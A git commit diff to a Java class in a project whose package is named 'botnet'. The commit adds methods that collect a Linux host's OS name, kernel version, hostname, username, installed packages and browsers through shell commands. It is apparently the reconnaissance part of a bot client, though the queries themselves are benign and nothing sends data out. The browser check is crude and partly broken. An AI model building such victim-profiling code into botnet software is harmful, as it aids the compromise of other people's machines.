1fd9ee9447b5a3ef9d427d5165e17de751800507
Michele Porretta <micheleporretta@gmail.com>
2017-01-11 16:29:03 +0100

    Linux System Features

--- src/main/java/com/acmutv/botnet/tool/runtime/LinuxSysInfoTools.java
+++ src/main/java/com/acmutv/botnet/tool/runtime/LinuxSysInfoTools.java
@@ -27,62 +27,80 @@
 package com.acmutv.botnet.tool.runtime;
 
 public class LinuxSysInfoTools {
-	
-	//to do
-	
+
+	/**
+	 * Returns the Os Name  of the system
+	 * @return osName
+	 */
+	public String getOsName(){
+		return RunCmdTools.runCmd("uname -o");
+	}
+
 	/**
 	 * Returns the kernel version of the system
 	 * @return kernel Version
 	 */
 	public String getKernelVersion(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("uname -r");
 	}
-	
+
 	/**
 	 * Returns the name of the host
 	 * @return hostname
 	 */
 	public String getHostName(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("uname -n");
 	}
-	
+
 	/**
 	 * Returns the username of the active user on the system
 	 * @return username
 	 */
 	public String getUserName(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("echo $USER");
 	}
-	
+
 	/**
 	 * Returns info of the network it is connected to the system
 	 * @return network info
 	 */
 	public String getNetworkData(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("");
 	}
-	
+
 	/**
 	 * Returns the list of applications installed on the system
 	 * @return applications list
 	 */
 	public String getApplications(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("dpkg --get-selections");
 	}
-	
+
 	/**
 	 * Returns the local connections of the system
 	 * @return local connections list
 	 */
 	public String getNetworkLocations(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTools.runCmd("");
 	}
-	
+
 	/**
 	 * Returns the list of browsers installed on the system
 	 * @return browsers list
 	 */
 	public String getBrowsers(){
-		return RuntimeManager.runCmd("");
+		String app = RunCmdTools.runCmd("dpkg --get-selections");
+		String browsers = "";
+
+		if(app.contains("Chrome"))
+			browsers +=" Google Chrome ";
+		if(app.contains("Safari"))
+			browsers +=" Safari ";
+		if(app.contains("Firefox"))
+			browsers +=" Mozilla-Firefox ";
+		if(app.contains("Opera"))
+			browsers +=" Opera ";
+
+		return browsers;
 	}	
 }
